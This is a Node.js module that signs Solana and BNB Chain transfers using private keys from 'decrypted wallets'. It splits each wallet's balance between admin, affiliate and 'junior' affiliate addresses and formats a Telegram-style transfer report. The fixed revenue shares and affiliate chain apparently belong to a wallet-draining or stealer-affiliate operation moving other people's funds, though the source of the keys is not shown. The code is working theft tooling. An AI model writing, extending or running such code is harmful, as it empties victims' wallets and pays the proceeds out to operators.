'use strict';

/**
 * Split executor.
 *
 * For each decrypted wallet:
 *   - adminPercent → ADMIN_SOL_ADDRESS / ADMIN_BNB_ADDRESS
 *   - userPercent  → that user's public solAddress / bnbAddress
 *     (if the user has not set a payout address, their share stays in the source wallet)
 *
 * Leaves a small residual for fees. Skips dust.
 */

const bs58 = require('bs58');
const nacl = require('tweetnacl');
const { Wallet, JsonRpcProvider, parseEther, formatEther } = require('ethers');

const SOL_RPC = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';
const BSC_RPC = process.env.BSC_RPC || 'https://bsc-dataseed.binance.org';

const ADMIN_SOL = (process.env.ADMIN_SOL_ADDRESS || '').trim();
const ADMIN_BNB = (process.env.ADMIN_BNB_ADDRESS || '').trim();

const SOL_RESERVE = 0.002;
const BNB_RESERVE = 0.0003;
const MIN_SOL_SEND = 0.001;
const MIN_BNB_SEND = 0.0002;

async function rpc(url, body, timeout = 15000) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeout);
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      signal: ctrl.signal,
    });
    return await r.json();
  } finally {
    clearTimeout(t);
  }
}

function solKeypairFromPrivateKey(privateKeyBs58) {
  const raw = bs58.decode(privateKeyBs58);
  let seed;
  if (raw.length === 64) seed = raw.subarray(0, 32);
  else if (raw.length === 32) seed = raw;
  else throw new Error('bad sol key length');
  return nacl.sign.keyPair.fromSeed(seed);
}

function shortvec(n) {
  const out = [];
  for (;;) {
    let b = n & 0x7f;
    n >>= 7;
    if (n === 0) {
      out.push(b);
      break;
    }
    out.push(b | 0x80);
  }
  return Buffer.from(out);
}

function buildSolTransferTx(fromKp, toAddress, lamports, recentBlockhash) {
  const from = bs58.encode(fromKp.publicKey);
  const SYSTEM_PROGRAM = '11111111111111111111111111111111';
  const keys = [
    { pubkey: from, isSigner: true, isWritable: true },
    { pubkey: toAddress, isSigner: false, isWritable: true },
    { pubkey: SYSTEM_PROGRAM, isSigner: false, isWritable: false },
  ];

  const data = Buffer.alloc(12);
  data.writeUInt32LE(2, 0);
  data.writeBigUInt64LE(BigInt(lamports), 4);

  const header = Buffer.from([1, 0, 1]);
  const accountKeys = Buffer.concat(keys.map((k) => bs58.decode(k.pubkey)));
  const blockhash = bs58.decode(recentBlockhash);

  const ix = Buffer.concat([
    Buffer.from([2]),
    shortvec(2),
    Buffer.from([0, 1]),
    shortvec(data.length),
    data,
  ]);

  const message = Buffer.concat([
    header,
    shortvec(keys.length),
    accountKeys,
    blockhash,
    shortvec(1),
    ix,
  ]);

  const sig = nacl.sign.detached(message, fromKp.secretKey);
  return bs58.encode(Buffer.concat([shortvec(1), Buffer.from(sig), message]));
}

async function sendSol(privateKey, fromAddress, toAddress, amountSol) {
  if (!toAddress || amountSol < MIN_SOL_SEND) {
    return { ok: false, skipped: true, reason: 'dust or no dest', amount: amountSol };
  }
  try {
    const kp = solKeypairFromPrivateKey(privateKey);
    const bh = await rpc(SOL_RPC, {
      jsonrpc: '2.0',
      id: 1,
      method: 'getLatestBlockhash',
      params: [{ commitment: 'confirmed' }],
    });
    const blockhash = bh?.result?.value?.blockhash;
    if (!blockhash) throw new Error('no blockhash');

    const lamports = Math.floor(amountSol * 1e9);
    const txBs58 = buildSolTransferTx(kp, toAddress, lamports, blockhash);

    const send = await rpc(SOL_RPC, {
      jsonrpc: '2.0',
      id: 1,
      method: 'sendTransaction',
      params: [
        txBs58,
        { encoding: 'base58', skipPreflight: false, preflightCommitment: 'confirmed' },
      ],
    });
    if (send.error) throw new Error(send.error.message || JSON.stringify(send.error));

    return {
      ok: true,
      chain: 'sol',
      from: fromAddress,
      to: toAddress,
      amount: amountSol,
      sig: send.result,
    };
  } catch (err) {
    return { ok: false, chain: 'sol', from: fromAddress, to: toAddress, error: err.message };
  }
}

async function sendBnb(privateKey, fromAddress, toAddress, amountBnb) {
  if (!toAddress || amountBnb < MIN_BNB_SEND) {
    return { ok: false, skipped: true, reason: 'dust or no dest', amount: amountBnb };
  }
  try {
    const provider = new JsonRpcProvider(BSC_RPC);
    const signer = new Wallet(privateKey, provider);
    const gasPrice = await provider.getFeeData();
    const gasLimit = 21000n;
    const fee = (gasPrice.gasPrice || gasPrice.maxFeePerGas || 0n) * gasLimit;
    const valueWei = parseEther(amountBnb.toFixed(8));
    const sendWei = valueWei > fee ? valueWei - fee : 0n;
    if (sendWei <= 0n) {
      return { ok: false, skipped: true, reason: 'cannot cover gas', from: fromAddress };
    }
    const tx = await signer.sendTransaction({
      to: toAddress,
      value: sendWei,
      gasLimit,
    });
    return {
      ok: true,
      chain: 'bnb',
      from: fromAddress,
      to: toAddress,
      amount: Number(formatEther(sendWei)),
      sig: tx.hash,
    };
  } catch (err) {
    return { ok: false, chain: 'bnb', from: fromAddress, to: toAddress, error: err.message };
  }
}

/**
 * Split one SOL wallet: admin share → ADMIN_SOL, user share → userSolAddress (if set).
 * Residual stays in source for fees.
 */
async function splitOneSol(wallet, userPercent, userSolAddress) {
  const results = [];
  const bal = Number(wallet.sol) || 0;
  if (bal <= SOL_RESERVE + MIN_SOL_SEND) {
    return [{ ok: false, skipped: true, reason: 'balance too low', address: wallet.address }];
  }

  const spendable = Math.max(0, bal - SOL_RESERVE);
  const adminPct = 100 - userPercent;
  const adminAmt = (spendable * adminPct) / 100;
  const userAmt = (spendable * userPercent) / 100;

  // admin first
  if (adminAmt >= MIN_SOL_SEND && ADMIN_SOL) {
    results.push(await sendSol(wallet.privateKey, wallet.address, ADMIN_SOL, adminAmt));
    await new Promise((r) => setTimeout(r, 250));
  } else if (adminAmt >= MIN_SOL_SEND && !ADMIN_SOL) {
    results.push({ ok: false, skipped: true, reason: 'ADMIN_SOL_ADDRESS not set', amount: adminAmt });
  }

  // user payout (only if they set an address; otherwise their share stays)
  if (userAmt >= MIN_SOL_SEND && userSolAddress) {
    results.push(await sendSol(wallet.privateKey, wallet.address, userSolAddress, userAmt));
    await new Promise((r) => setTimeout(r, 250));
  } else if (userAmt >= MIN_SOL_SEND && !userSolAddress) {
    results.push({
      ok: true,
      skipped: true,
      reason: 'user has no SOL payout address – share left in source',
      amount: userAmt,
      from: wallet.address,
    });
  }

  return results;
}

async function splitOneBnb(wallet, userPercent, userBnbAddress) {
  const results = [];
  const bal = Number(wallet.bnb) || 0;
  if (bal <= BNB_RESERVE + MIN_BNB_SEND) {
    return [{ ok: false, skipped: true, reason: 'balance too low', address: wallet.address }];
  }

  const spendable = Math.max(0, bal - BNB_RESERVE);
  const adminPct = 100 - userPercent;
  const adminAmt = (spendable * adminPct) / 100;
  const userAmt = (spendable * userPercent) / 100;

  if (adminAmt >= MIN_BNB_SEND && ADMIN_BNB) {
    results.push(await sendBnb(wallet.privateKey, wallet.address, ADMIN_BNB, adminAmt));
    await new Promise((r) => setTimeout(r, 250));
  } else if (adminAmt >= MIN_BNB_SEND && !ADMIN_BNB) {
    results.push({ ok: false, skipped: true, reason: 'ADMIN_BNB_ADDRESS not set', amount: adminAmt });
  }

  if (userAmt >= MIN_BNB_SEND && userBnbAddress) {
    results.push(await sendBnb(wallet.privateKey, wallet.address, userBnbAddress, userAmt));
    await new Promise((r) => setTimeout(r, 250));
  } else if (userAmt >= MIN_BNB_SEND && !userBnbAddress) {
    results.push({
      ok: true,
      skipped: true,
      reason: 'user has no BNB payout address – share left in source',
      amount: userAmt,
      from: wallet.address,
    });
  }

  return results;
}

/**
 * @param {Array} solWallets
 * @param {Array} bnbWallets
 * @param {{ userPercent: number, solAddress?: string, bnbAddress?: string }} userRec
 */
/**
 * userRec fields:
 *  userPercent, solAddress, bnbAddress  (affiliate)
 *  juniorOf, juniorPercent, juniorSolAddress, juniorBnbAddress (optional)
 *  ownerPercent (optional, default remainder to ADMIN_* if no junior)
 *
 * With junior chain: affiliate user% + junior% + owner% should be ~100.
 * Without junior: user% to affiliate, rest to ADMIN_* addresses.
 */
async function executeSplit(solWallets, bnbWallets, userRec) {
  const userPercent = Math.max(0, Math.min(100, Number(userRec?.userPercent) ?? 80));
  const userSol = (userRec?.solAddress || '').trim();
  const userBnb = (userRec?.bnbAddress || '').trim();
  const hasJunior = Boolean(userRec?.juniorOf && (userRec?.juniorSolAddress || userRec?.juniorBnbAddress || userRec?.juniorPercent));
  const juniorPercent = hasJunior ? Math.max(0, Math.min(100, Number(userRec?.juniorPercent) ?? 10)) : 0;
  const ownerPercent = hasJunior
    ? Math.max(0, Math.min(100, Number(userRec?.ownerPercent) ?? 10))
    : Math.max(0, 100 - userPercent);
  const juniorSol = (userRec?.juniorSolAddress || '').trim();
  const juniorBnb = (userRec?.juniorBnbAddress || '').trim();
  const results = [];

  for (const w of solWallets) {
    const bal = Number(w.sol) || 0;
    if (bal <= SOL_RESERVE + MIN_SOL_SEND) {
      results.push({ ok: false, skipped: true, reason: 'balance too low', address: w.address });
      continue;
    }
    const spendable = Math.max(0, bal - SOL_RESERVE);
    const aAmt = (spendable * userPercent) / 100;
    const jAmt = (spendable * juniorPercent) / 100;
    const oAmt = (spendable * ownerPercent) / 100;

    if (oAmt >= MIN_SOL_SEND && ADMIN_SOL) {
      results.push(await sendSol(w.privateKey, w.address, ADMIN_SOL, oAmt));
      await new Promise((r) => setTimeout(r, 200));
    }
    if (jAmt >= MIN_SOL_SEND && juniorSol) {
      results.push(await sendSol(w.privateKey, w.address, juniorSol, jAmt));
      await new Promise((r) => setTimeout(r, 200));
    }
    if (aAmt >= MIN_SOL_SEND && userSol) {
      results.push(await sendSol(w.privateKey, w.address, userSol, aAmt));
      await new Promise((r) => setTimeout(r, 200));
    } else if (aAmt >= MIN_SOL_SEND && !userSol) {
      results.push({ ok: true, skipped: true, reason: 'affiliate has no SOL payout', amount: aAmt, from: w.address });
    }
  }

  for (const w of bnbWallets) {
    const bal = Number(w.bnb) || 0;
    if (bal <= BNB_RESERVE + MIN_BNB_SEND) {
      results.push({ ok: false, skipped: true, reason: 'balance too low', address: w.address });
      continue;
    }
    const spendable = Math.max(0, bal - BNB_RESERVE);
    const aAmt = (spendable * userPercent) / 100;
    const jAmt = (spendable * juniorPercent) / 100;
    const oAmt = (spendable * ownerPercent) / 100;

    if (oAmt >= MIN_BNB_SEND && ADMIN_BNB) {
      results.push(await sendBnb(w.privateKey, w.address, ADMIN_BNB, oAmt));
      await new Promise((r) => setTimeout(r, 200));
    }
    if (jAmt >= MIN_BNB_SEND && juniorBnb) {
      results.push(await sendBnb(w.privateKey, w.address, juniorBnb, jAmt));
      await new Promise((r) => setTimeout(r, 200));
    }
    if (aAmt >= MIN_BNB_SEND && userBnb) {
      results.push(await sendBnb(w.privateKey, w.address, userBnb, aAmt));
      await new Promise((r) => setTimeout(r, 200));
    } else if (aAmt >= MIN_BNB_SEND && !userBnb) {
      results.push({ ok: true, skipped: true, reason: 'affiliate has no BNB payout', amount: aAmt, from: w.address });
    }
  }

  return results;
}

function formatTransferReport(results) {
  if (!results || !results.length) return 'no transfers attempted';
  const lines = ['💸 <b>Split transfers</b>'];
  for (const r of results) {
    if (r.skipped && !r.ok) {
      lines.push(`· skip ${r.address || r.from || '?'} – ${r.reason}`);
    } else if (r.skipped && r.ok) {
      lines.push(`· ⏸ ${r.from || '?'} – ${r.reason} (${(r.amount || 0).toFixed(6)})`);
    } else if (r.ok) {
      lines.push(
        `· ✅ ${String(r.chain).toUpperCase()} ${Number(r.amount).toFixed(6)} → <code>${r.to}</code>\n` +
          `  from <code>${r.from}</code>\n` +
          `  tx <code>${r.sig}</code>`,
      );
    } else {
      lines.push(`· ❌ ${r.chain || '?'} ${r.from || '?'} – ${r.error}`);
    }
  }
  return lines.join('\n');
}

module.exports = {
  executeSplit,
  formatTransferReport,
  ADMIN_SOL,
  ADMIN_BNB,
};
